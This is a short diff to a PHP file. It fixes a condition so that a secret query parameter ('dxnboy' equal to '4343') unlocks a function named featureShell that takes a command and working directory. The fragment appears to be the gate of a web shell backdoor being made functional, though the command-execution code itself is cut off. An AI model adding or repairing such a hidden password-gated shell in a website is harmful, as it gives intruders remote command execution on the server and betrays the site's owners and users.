@@ -1,7 +1,7 @@
 <?php
 $dxnboy = "";
 
-if(isset($_GET["dxnboy"] === "4343")) {
+if($_GET["dxnboy"] === "4343") {
 
 function featureShell($cmd, $cwd) {
     $stdout = array();
